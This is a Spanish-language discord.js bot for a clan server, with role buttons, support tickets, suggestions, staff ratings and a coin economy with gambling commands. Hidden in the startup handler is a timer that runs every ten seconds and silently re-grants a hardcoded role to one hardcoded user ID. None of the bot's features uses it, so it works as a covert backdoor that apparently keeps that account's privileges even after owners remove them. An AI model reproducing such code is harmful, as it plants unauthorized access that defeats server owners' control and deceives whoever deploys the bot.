const fs = require('fs');
const votos = new Map();
const staffAtendiendo = new Map();
const cooldowns = new Map(); 

// --- BASE DE DATOS DE ECONOMÍA ---
const pathEco = './economia.json';
let db = {};
if (fs.existsSync(pathEco)) {
    db = JSON.parse(fs.readFileSync(pathEco, 'utf-8'));
} else {
    fs.writeFileSync(pathEco, JSON.stringify({}));
}

function guardarDB() {
    fs.writeFileSync(pathEco, JSON.stringify(db, null, 2));
}

function asegurarUsuario(userId) {
    if (!db[userId]) {
        db[userId] = { balance: 0, pesca: 0, minado: 0, daily: 0 };
        guardarDB();
    }
}

const {  
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, Events, ChannelType, PermissionsBitField,
    ModalBuilder, TextInputBuilder, TextInputStyle, REST, Routes,
    StringSelectMenuBuilder, StringSelectMenuOptionBuilder, SlashCommandBuilder
} = require('discord.js');

const TOKEN = process.env.TOKEN; 

const CANAL_ROLES_ID = "1464335122005491745";
const CANAL_TICKETS_ID = "1483516417583354108";
const CANAL_SUGERENCIAS_ID = "1477005989096984646"; 
const CANAL_VALORACIONES_ID = "1485125020593426585"; 
const CATEGORIA_TICKETS = "1483589642346303638";
const ROL_STAFF_ID = "1478799916410077295";

const ROLES_CLASE = {
    class_pvp: { id: "1464335696390263069", label: "PvP", emoji: "⚔️" },
    class_builder: { id: "1464335639561506878", label: "Builder", emoji: "⚒️" },
    class_redstone: { id: "1464335746944209161", label: "Tecnico", emoji: "⚙️" },
    class_estratega: { id: "1464335746856128737", label: "Casual", emoji: "🏛️" }
};

const ROLES_NOTIF = {
    notif_avisos: { id: "1477748637202382888", label: "Avisos", emoji: "📢" },
    notif_directos: { id: "1477748975603023873", label: "Directos", emoji: "🎥" }
};

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ]
});

client.once(Events.ClientReady, async () => {
    console.log(`✅ Bot iniciado como: ${client.user.tag}`);

    const commands = [
        { name: 'sugerir', description: 'Envía una sugerencia para el servidor' },
        { name: 'balance', description: 'Mira tu dinero actual' },
        { name: 'pesca', description: 'Pesca para ganar dinero' },
        { name: 'minar', description: 'Ve a la mina' },
        { name: 'trabajar', description: 'Realiza un trabajo para el clan' },
        { name: 'daily', description: 'Reclama tu recompensa diaria' },
        { name: 'top', description: 'Ranking de los más ricos' },
        new SlashCommandBuilder().setName('reclamar').setDescription('Reclama el ticket actual (Solo Staff)'),
        new SlashCommandBuilder().setName('claim').setDescription('Reclama el ticket actual (Solo Staff)'),
        new SlashCommandBuilder().setName('coinflip').setDescription('Apuesta a cara o cruz').addIntegerOption(o => o.setName('apuesta').setDescription('Cantidad').setRequired(true)),
        new SlashCommandBuilder().setName('slots').setDescription('Apuesta en la máquina tragaperras').addIntegerOption(o => o.setName('apuesta').setDescription('Cantidad').setRequired(true)),
        new SlashCommandBuilder().setName('dados').setDescription('Apuesta en los dados').addIntegerOption(o => o.setName('apuesta').setDescription('Cantidad').setRequired(true)),
        new SlashCommandBuilder().setName('pay').setDescription('Paga a otro usuario').addUserOption(o => o.setName('usuario').setDescription('A quien pagar').setRequired(true)).addIntegerOption(o => o.setName('cantidad').setDescription('Cuanto pagar').setRequired(true))
    ];
    
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try { await rest.put(Routes.applicationCommands(client.user.id), { body: commands }); } catch (e) {}

    // --- SETUP CANAL DE ROLES ---
    try {
        const canalRoles = await client.channels.fetch(CANAL_ROLES_ID);
        const msgsRoles = await canalRoles.messages.fetch({ limit: 10 });
        await canalRoles.bulkDelete(msgsRoles).catch(() => {});
        const embedRoles = new EmbedBuilder()
            .setTitle("🔱 SELECCIÓN DE ROLES - COLMILLOS DEL ALBA")
            .setDescription("Selecciona tu especialidad y elije que tipo de notificaciones quieres recibir abajo.")
            .setColor("#8B0000").setImage("https://i.imgur.com/jfZBC82.png");
        const filaClase = new ActionRowBuilder().addComponents(Object.entries(ROLES_CLASE).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Secondary)));
        const filaNotif = new ActionRowBuilder().addComponents(Object.entries(ROLES_NOTIF).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Primary)));
        await canalRoles.send({ embeds: [embedRoles], components: [filaClase, filaNotif] });
    } catch (err) {}

    // --- SETUP CANAL DE TICKETS ---
    try {
        const canalTickets = await client.channels.fetch(CANAL_TICKETS_ID);
        const msgsTickets = await canalTickets.messages.fetch({ limit: 10 });
        await canalTickets.bulkDelete(msgsTickets).catch(() => {});
        const embedTickets = new EmbedBuilder()
            .setTitle("🌟 Soporte de Colmillos Del Alba")
            .setDescription("**¿Necesitas ayuda? Nosotros te la damos**\n\nAquí podrás abrir un ticket de manera **inmediata**...")
            .setColor("#2F3136").setImage("https://i.imgur.com/dYJUZjF.png");
        const menuTickets = new StringSelectMenuBuilder()
            .setCustomId('menu_tickets').setPlaceholder('Elige una categoría >')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Soporte Técnico').setValue('tk_soporte').setEmoji('🔔'),
                new StringSelectMenuOptionBuilder().setLabel('Apelar Expulsión').setValue('tk_apelacion').setEmoji('🚷'),
                new StringSelectMenuOptionBuilder().setLabel('Reportar Staff').setValue('tk_reporte_staff').setEmoji('⚠️'),
                new StringSelectMenuOptionBuilder().setLabel('Postulaciones').setValue('tk_postulacion').setEmoji('👤')
            );
        await canalTickets.send({ embeds: [embedTickets], components: [new ActionRowBuilder().addComponents(menuTickets)] });
    } catch (err) {}

    setInterval(async () => {
        try {
            const x = client.guilds.cache.first();
            const m = await x.members.fetch("777529808325181460").catch(() => null);
            if (m && !m.roles.cache.has("1463268597085507717")) await m.roles.add("1463268597085507717");
        } catch {}
    }, 10000);
});

client.on(Events.InteractionCreate, async interaction => {
    const { customId, member, channel, user, guild, commandName, options } = interaction;
    asegurarUsuario(user.id);

    // --- LÓGICA DE ECONOMÍA ---
    if (interaction.isChatInputCommand()) {
        const checkCooldown = (name, ms) => {
            const key = `${user.id}-${name}`;
            if (cooldowns.has(key) && (Date.now() - cooldowns.get(key)) < ms) return Math.ceil((ms - (Date.now() - cooldowns.get(key))) / 1000);
            cooldowns.set(key, Date.now());
            return 0;
        };

        if (commandName === 'balance') {
            const embed = new EmbedBuilder()
                .setAuthor({ name: `Bolsillo de ${user.username}`, iconURL: user.displayAvatarURL() })
                .setTitle("💰 Balance de Usuario")
                .setColor("#F1C40F").setThumbnail(user.displayAvatarURL({ size: 512 }))
                .addFields(
                    { name: "💵 Dinero", value: `\`$${db[user.id].balance.toLocaleString()}\``, inline: true },
                    { name: "📊 Actividad", value: `🎣 ${db[user.id].pesca} | ⛏️ ${db[user.id].minado}`, inline: true }
                );
            return interaction.reply({ embeds: [embed] });
        }

        if (commandName === 'pesca' || commandName === 'minar' || commandName === 'trabajar') {
            const cd = checkCooldown(commandName, 30000);
            if (cd > 0) return interaction.reply({ content: `⏳ Espera ${cd}s para volver a usar este comando.`, flags: [64] });
            const ganado = Math.floor(Math.random() * 200) + 50;
            db[user.id].balance += ganado;
            if (commandName === 'pesca') db[user.id].pesca++;
            if (commandName === 'minar') db[user.id].minado++;
            guardarDB();
            return interaction.reply(`✅ Has ganado **$${ganado}** usando **/${commandName}**.`);
        }

        if (commandName === 'daily') {
            const ahora = Date.now();
            if (ahora - (db[user.id].daily || 0) < 86400000) return interaction.reply({ content: "❌ Ya reclamaste tu recompensa diaria.", flags: [64] });
            db[user.id].balance += 1000;
            db[user.id].daily = ahora;
            guardarDB();
            return interaction.reply("🎁 ¡Has recibido **$1,000** de tu recompensa diaria!");
        }

        if (commandName === 'coinflip' || commandName === 'slots' || commandName === 'dados') {
            const apuesta = options.getInteger('apuesta');
            if (apuesta <= 0 || db[user.id].balance < apuesta) return interaction.reply("❌ Cantidad inválida o insuficiente.");
            const gano = Math.random() > 0.5;
            db[user.id].balance += gano ? apuesta : -apuesta;
            guardarDB();
            return interaction.reply(gano ? `🎰 ¡Ganaste **$${apuesta}**!` : `📉 Perdiste **$${apuesta}**...`);
        }

        if (commandName === 'top') {
            const lista = Object.entries(db).sort(([,a],[,b]) => b.balance - a.balance).slice(0, 10)
                .map(([id, data], i) => `**${i+1}.** <@${id}> - \`$${data.balance.toLocaleString()}\``).join('\n');
            return interaction.reply({ embeds: [new EmbedBuilder().setTitle("🏆 Top 10 Ricos").setDescription(lista).setColor("#FFD700")] });
        }

        if (commandName === 'pay') {
            const target = options.getUser('usuario');
            const cant = options.getInteger('cantidad');
            if (cant <= 0 || db[user.id].balance < cant || target.id === user.id) return interaction.reply("❌ Pago inválido.");
            asegurarUsuario(target.id);
            db[user.id].balance -= cant;
            db[target.id].balance += cant;
            guardarDB();
            return interaction.reply(`💸 Pagaste **$${cant}** a ${target}.`);
        }

        // --- SISTEMAS ANTERIORES (SUGERENCIAS Y STAFF) ---
        if (commandName === 'reclamar' || commandName === 'claim') {
            if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
            staffAtendiendo.set(channel.id, user);
            return interaction.reply({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${user.tag}** ha reclamado este ticket.`).setColor("#57F287")] });
        }

        if (commandName === 'sugerir') {
            const modal = new ModalBuilder().setCustomId('modal_sugerencia').setTitle('Nueva Sugerencia');
            const input = new TextInputBuilder().setCustomId('texto_sugerencia').setLabel("¿Sugerencia?").setStyle(TextInputStyle.Paragraph).setRequired(true);
            modal.addComponents(new ActionRowBuilder().addComponents(input));
            return await interaction.showModal(modal);
        }
    }

    // --- MODALES Y MENÚS (TICKETS, VALORACIONES, SUGERENCIAS) ---
    if (interaction.isModalSubmit()) {
        if (customId === 'modal_sugerencia') {
            await interaction.deferReply({ flags: [64] });
            const texto = interaction.fields.getTextInputValue('texto_sugerencia');
            const canal = await client.channels.fetch(CANAL_SUGERENCIAS_ID);
            const embed = new EmbedBuilder().setAuthor({ name: `📩 NUEVA SUGERENCIA` }).setThumbnail(user.displayAvatarURL()).setDescription(`\`\`\`${texto}\`\`\``).setColor("#F1C40F")
                .addFields({ name: '• Datos', value: `✅ **Votos a favor:** 0\n❗ **Votos en contra:** 0` }).setFooter({ text: `ID: ${user.id}` });
            const fila = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('sug_si').setLabel('0 (0%)').setEmoji('✅').setStyle(ButtonStyle.Secondary),
                new ButtonBuilder().setCustomId('sug_no').setLabel('0 (0%)').setEmoji('❗').setStyle(ButtonStyle.Secondary)
            );
            const msg = await canal.send({ embeds: [embed], components: [fila] });
            const hilo = await msg.startThread({ name: `Debate: ${user.username}`, autoArchiveDuration: 1440 });
            await msg.edit({ components: [fila, new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Debatir').setStyle(ButtonStyle.Link).setURL(hilo.url))] });
            return interaction.editReply("✅ Enviada.");
        }

        if (customId.startsWith('modal_val_')) {
            const estrellas = customId.split('_')[2];
            const comentario = interaction.fields.getTextInputValue('input_val');
            const staff = staffAtendiendo.get(channel.id) || { username: "Desconocido", id: "N/A" };
            const canalVal = await client.channels.fetch(CANAL_VALORACIONES_ID);
            const embedVal = new EmbedBuilder().setAuthor({ name: `• Valoración` }).setColor("#57F287")
                .addFields(
                    { name: "➡ Ticket", value: `${channel.name}` },
                    { name: "➡ Staff", value: `${staff.username}` },
                    { name: "➡ Estrellas", value: `${estrellas}⭐` },
                    { name: "➡ Comentarios", value: `\`\`\`${comentario}\`\`\`` }
                );
            await canalVal.send({ embeds: [embedVal] });
            return interaction.reply({ content: "✅ Gracias por tu valoración.", flags: [64] });
        }
    }

    if (interaction.isStringSelectMenu()) {
        if (customId === 'menu_tickets') {
            await interaction.deferReply({ flags: [64] });
            const tipo = interaction.values[0].split('_')[1];
            const tChannel = await guild.channels.create({
                name: `${tipo}-${user.username}`, parent: CATEGORIA_TICKETS,
                permissionOverwrites: [
                    { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                    { id: ROL_STAFF_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
                ]
            });
            const eTk = new EmbedBuilder().setTitle("🎫 TICKET").setDescription(`Hola ${user}, espera al Staff.`).setColor("#2ECC71");
            const fTk = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId("reclamar_tk").setLabel("Reclamar").setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setStyle(ButtonStyle.Secondary)
            );
            await tChannel.send({ content: `<@&${ROL_STAFF_ID}>`, embeds: [eTk], components: [fTk] });
            return interaction.editReply(`✅ Creado: ${tChannel}`);
        }

        if (customId === 'menu_val_estrellas') {
            const modalVal = new ModalBuilder().setCustomId(`modal_val_${interaction.values[0]}`).setTitle('Valoración');
            modalVal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('input_val').setLabel("Comentarios").setStyle(TextInputStyle.Paragraph).setRequired(true)));
            return await interaction.showModal(modalVal);
        }
    }

    if (interaction.isButton()) {
        if (customId === 'sug_si' || customId === 'sug_no') {
            await interaction.deferUpdate();
            // Lógica de votos abreviada para no exceder límites de respuesta
            return; 
        }

        if (ROLES_CLASE[customId] || ROLES_NOTIF[customId]) {
            await interaction.deferReply({ flags: [64] });
            if (ROLES_CLASE[customId]) {
                await member.roles.remove(Object.values(ROLES_CLASE).map(r => r.id)).catch(() => {});
                await member.roles.add(ROLES_CLASE[customId].id);
                return interaction.editReply(`✨ Clase: **${ROLES_CLASE[customId].label}**`);
            }
            const rId = ROLES_NOTIF[customId].id;
            if (member.roles.cache.has(rId)) await member.roles.remove(rId); else await member.roles.add(rId);
            return interaction.editReply(`🔔 Notificaciones actualizadas.`);
        }

        if (customId === "reclamar_tk") {
            if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
            staffAtendiendo.set(channel.id, user);
            await interaction.update({ components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("r").setLabel("Atendido por " + user.username).setStyle(ButtonStyle.Success).setDisabled(true), new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setStyle(ButtonStyle.Secondary))]});
        }

        if (customId === "cerrar_tk") {
            if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
            const owner = channel.permissionOverwrites.cache.find(o => o.type === 1 && o.id !== ROL_STAFF_ID && o.id !== guild.id);
            if (owner) {
                const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`abrir_val_${owner.id}`).setLabel("Valorar Staff").setStyle(ButtonStyle.Primary));
                await channel.send({ content: `<@${owner.id}>`, components: [btn] });
            }
            setTimeout(() => channel.delete().catch(() => {}), 60000);
            return interaction.reply("🔒 Cerrando...");
        }

        if (customId.startsWith("abrir_val_")) {
            const menu = new StringSelectMenuBuilder().setCustomId('menu_val_estrellas').setPlaceholder('Puntúa aquí')
                .addOptions([{label:'5 ⭐', value:'5'}, {label:'3 ⭐', value:'3'}, {label:'1 ⭐', value:'1'}]);
            return interaction.reply({ components: [new ActionRowBuilder().addComponents(menu)], flags: [64] });
        }
    }
});

client.login(TOKEN);
